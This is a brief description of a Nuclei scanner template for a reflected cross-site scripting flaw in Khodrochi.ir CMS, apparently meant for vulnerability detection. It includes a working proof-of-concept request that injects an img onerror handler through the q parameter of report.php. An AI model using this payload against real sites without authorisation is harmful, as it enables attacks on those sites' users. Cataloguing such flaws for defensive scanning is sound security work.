# Nuclei Template: Khodrochi CMS - Cross Site Scripting
**Template ID:** khodrochi-cms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`khodrochi-cms-xss.yaml`)

## Vulnerability Information & PoC

## Description
A cross site scripting vulnerability was found in the Khodrochi.ir CMS an Iranian Car Services Platform.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E
```

## References
- https://www.exploitalert.com/view-details.html?id=38723
- https://cxsecurity.com/ascii/WLB-2022050087
